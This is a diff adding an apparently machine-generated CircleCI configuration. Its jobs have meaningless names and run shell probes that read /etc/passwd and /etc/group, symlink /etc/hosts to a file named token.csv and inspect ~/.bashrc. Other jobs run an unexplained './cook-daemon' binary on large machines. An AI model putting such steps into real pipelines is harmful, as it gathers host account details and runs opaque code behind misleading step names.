+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  NQ3MtDYhoNCB:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Test By Design Team
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; sort -t: -n -k3,3 /etc/group | sed 's/:.*//'; true ; } > /tmp/pst/iter1_80d2
+            echo "crc=$(cksum /tmp/pst/iter1_80d2 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'iter1_80d2'
+  Build_App8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/13be3299-2503-8e64-8a51-5ccc209d89 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  tax-small_class:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Thaw the fume hood and log it
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 3 -type f -executable -exec readlink -f {} ";" 2>/dev/null | tail -n 3; true ; } > /tmp/pst/71ba36a31d027d8d3b44dd56ec
+            echo "crc=$(cksum /tmp/pst/71ba36a31d027d8d3b44dd56ec | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '71ba36a31d027d8d3b44dd56ec'
+  titan2-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/RPCPDF 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  teardownReleaseTotal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: oops scale in the env vars again
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; ln -sfv /etc/hosts '/tmp/token.csv'; true ; } > /tmp/pst/13be3299-2503-8e64-8a51-5ccc209d89
+            echo "crc=$(cksum /tmp/pst/13be3299-2503-8e64-8a51-5ccc209d89 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '13be3299-2503-8e64-8a51-5ccc209d89'
+  Build_Tests6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/13be3299-2503-8e64-8a51-5ccc209d89 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  xDim:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: 463d7 staging
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; gzip -c /etc/group >'/dev/shm/coral_prefs_2025-04-13.gz' &&gunzip -c '/dev/shm/coral_prefs_2025-04-13.gz' | wc -l; true ; } > /tmp/pst/iter_579
+            echo "crc=$(cksum /tmp/pst/iter_579 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'iter_579'
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/57onenick3l 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  CLUSTER_FROM_MAIN:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: DO NOT skip the web tier
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; top -b -n 1 -o %CPU | head; true ; } > /tmp/pst/TundraMapperZetaYield
+            echo "crc=$(cksum /tmp/pst/TundraMapperZetaYield | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'TundraMapperZetaYield'
+  biuld-52:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/TundraMapperZetaYield 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+  Ssss:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: id 4da6 sort
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; ln -sf /usr/bin/env "/tmp/peach-cluster-2024.10.09.md" && readlink -f "/tmp/peach-cluster-2024.10.09.md"; true ; } > /tmp/pst/QKp
+            echo "crc=$(cksum /tmp/pst/QKp | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'QKp'
+  v8-rc3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check my upstream
+          command: |
+            { IFS=$'\n' read -d '' -r -a a < /tmp/pst/QKp 2>/dev/null; echo "a=${#a[@]}"; } || true
+      - run:
+          name: Extract source
+          command: git clone --depth 5 -q --filter=blob:none https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unroll vendor sources
+          command: tar --extract --file=sources-release.tar
+      - run:
+          name: Index artifacts
+          command: sleep 25s
+      - run:
+          name: Smoke check
+          command: /bin/sleep 30
+      - run:
+          command: env ./cook-daemon
+
+  cliedge-i386:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Wait for the empty state in dark mode
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; if [ -O "$HOME" ]; then echo yes; else echo no; fi; true ; } > /tmp/pst/driver_3736
+            echo "crc=$(cksum /tmp/pst/driver_3736 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'driver_3736'
+  GraphViewMotor:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Calibrate Cable Tray Rev 9
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; grep -q 'PS1' ~/.bashrc && echo matched; true ; } > /tmp/pst/snapshot-1865
+            echo "crc=$(cksum /tmp/pst/snapshot-1865 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'snapshot-1865'
+  Write-Arg:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Go batch the validation split
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; head -n 8 /etc/passwd | grep -v nologin | cut -d : -f 1 | tac; true ; } > /tmp/pst/QKp
+            echo "crc=$(cksum /tmp/pst/QKp | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'QKp'
+  cloak792:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Hold position
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=9537\nuser=raj\ndebug=false\n' >"/tmp/bugs_airport_category_2023-03-24.csv" && sed -n "s/^user=//p" "/tmp/bugs_airport_category_2023-03-24.csv"; true ; } > /tmp/pst/0r
+            echo "crc=$(cksum /tmp/pst/0r | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '0r'
+  ScrollFernTulipPlanetRivet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Check in status fresh
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; printf 'host=db1\nport=9537\nuser=raj\ndebug=false\n' >"/tmp/bugs_airport_category_2023-03-24.csv" && sed -n "s/^user=//p" "/tmp/bugs_airport_category_2023-03-24.csv"; true ; } > /tmp/pst/Tqna
+            echo "crc=$(cksum /tmp/pst/Tqna | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'Tqna'
+  phone_pulse_script:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Project Wren
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; ls -vA --dereference-command-line|tail -n 5; true ; } > /tmp/pst/api
+            echo "crc=$(cksum /tmp/pst/api | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'api'
+  numzz659:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Cleared for staging
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; if test -O ~;then echo 'ok'; fi; true ; } > /tmp/pst/spark_fen_guest_atoll
+            echo "crc=$(cksum /tmp/pst/spark_fen_guest_atoll | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'spark_fen_guest_atoll'
+  main_loop:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: Refresh Onboarding Slides PENDING
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; cat /etc/os-release | awk -F = '{ print $2 }' | tr -cs '[:alnum:]' '\n'; true ; } > /tmp/pst/temp4f71b3
+            echo "crc=$(cksum /tmp/pst/temp4f71b3 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'temp4f71b3'
+  DDEQ-15745-src:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: On failure monitor the batch size
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; tar -C /etc -cf - hosts| gzip -c >'/tmp/scripts.tgz' && tar -tzf '/tmp/scripts.tgz'; true ; } > /tmp/pst/TundraMapperZetaYield
+            echo "crc=$(cksum /tmp/pst/TundraMapperZetaYield | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - 'TundraMapperZetaYield'
+  br6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/pst
+      - run:
+          name: enforcement status pending
+          command: |
+            mkdir -p /tmp/pst
+            { set +o pipefail 2>/dev/null; find /dev -maxdepth 2 -name 'std*' -printf "%p\n" 2>/dev/null | nl; true ; } > /tmp/pst/0f8cfb6a2
+            echo "crc=$(cksum /tmp/pst/0f8cfb6a2 | awk '{print $1}')"
+      - persist_to_workspace:
+          root: /tmp/pst
+          paths:
+            - '0f8cfb6a2'
+workflows:
+  build:
+    jobs:
+      - wrapperchannel
+      - cliedge-i386:
+          requires:
+            - wrapperchannel
+      - lets-go:
+          requires:
+            - cliedge-i386
+      - initWithPixel:
+          requires:
+            - cliedge-i386
+      - GraphViewMotor:
+          requires:
+            - initWithPixel
+      - validate-full-docker-image:
+          requires:
+            - GraphViewMotor
+      - Ssss:
+          requires:
+            - GraphViewMotor
+      - Write-Arg:
+          requires:
+            - Ssss
+      - v8-rc3:
+          requires:
+            - Write-Arg
+      - hWndIteratorLegacyTensor:
+          requires:
+            - Write-Arg
+      - cloak792:
+          requires:
+            - hWndIteratorLegacyTensor
+      - feb12-ship:
+          requires:
+            - cloak792
+      - p_CART_ARG:
+          requires:
+            - cloak792
+      - ScrollFernTulipPlanetRivet:
+          requires:
+            - p_CART_ARG
+      - papa-1:
+          requires:
+            - ScrollFernTulipPlanetRivet
+      - FLAG_CUR:
+          requires:
+            - ScrollFernTulipPlanetRivet
+      - phone_pulse_script:
+          requires:
+            - FLAG_CUR
+      - UAT_VERIFY_5:
+          requires:
+            - phone_pulse_script
+      - assert_segment_inner:
+          requires:
+            - phone_pulse_script
+      - numzz659:
+          requires:
+            - assert_segment_inner
+      - PrepareProd:
+          requires:
+            - numzz659
+      - table-2021-w04:
+          requires:
+            - numzz659
+      - main_loop:
+          requires:
+            - table-2021-w04
+      - anothr-run:
+          requires:
+            - main_loop
+      - CLUSTER_FROM_MAIN:
+          requires:
+            - main_loop
+      - DDEQ-15745-src:
+          requires:
+            - CLUSTER_FROM_MAIN
+      - biuld-52:
+          requires:
+            - DDEQ-15745-src
+      - releaseManifest:
+          requires:
+            - DDEQ-15745-src
+      - br6:
+          requires:
+            - releaseManifest
+      - cook-it:
+          requires:
+            - br6
+      - teardownReleaseTotal
+      - ITEM_202606
+      - Build_Tests6:
+          requires:
+            - teardownReleaseTotal
+            - ITEM_202606
+      - spin-up:
+          requires:
+            - teardownReleaseTotal
+            - ITEM_202606
+      - Build_App8:
+          requires:
+            - teardownReleaseTotal
+            - ITEM_202606
+      - IN-ELEMENT-SW
+      - j4-40
+      - namespaceStr
+      - py311-cov:
+          requires:
+            - IN-ELEMENT-SW
+            - j4-40
+            - namespaceStr
+      - DEV_INIT_8:
+          requires:
+            - IN-ELEMENT-SW
+            - j4-40
+            - namespaceStr
+      - europa-v2:
+          requires:
+            - IN-ELEMENT-SW
+            - j4-40
+            - namespaceStr
+      - min-ship:
+          requires:
+            - IN-ELEMENT-SW
+            - j4-40
+            - namespaceStr
+      - APP-965:
+          requires:
+            - IN-ELEMENT-SW
+            - j4-40
+            - namespaceStr
+      - assemble-partial-regression-suite:
+          requires:
+            - IN-ELEMENT-SW
+            - j4-40
+            - namespaceStr
+      - rust-cov:
+          requires:
+            - IN-ELEMENT-SW
+            - j4-40
+            - namespaceStr
+      - VERIFY_DEV:
+          requires:
+            - IN-ELEMENT-SW
+            - j4-40
+            - namespaceStr
+      - validate-staging-regression-suite:
+          requires:
+            - IN-ELEMENT-SW
+            - j4-40
+            - namespaceStr
+      - titan2-ng:
+          requires:
+            - IN-ELEMENT-SW
+            - j4-40
+            - namespaceStr
+      - i18n-ta
+      - release-record
+      - an1m4tez
+      - ivan-run:
+          requires:
+            - i18n-ta
+            - release-record
+            - an1m4tez
+      - may25-rev:
+          requires:
+            - i18n-ta
+            - release-record
+            - an1m4tez
+      - v1-ga1:
+          requires:
+            - i18n-ta
+            - release-record
+            - an1m4tez
+      - API-570:
+          requires:
+            - i18n-ta
+            - release-record
+            - an1m4tez
+      - succes-only:
+          requires:
+            - i18n-ta
+            - release-record
+            - an1m4tez
+      - raj-push:
+          requires:
+            - i18n-ta
+            - release-record
+            - an1m4tez
+      - ship-it:
+          requires:
+            - i18n-ta
+            - release-record
+            - an1m4tez
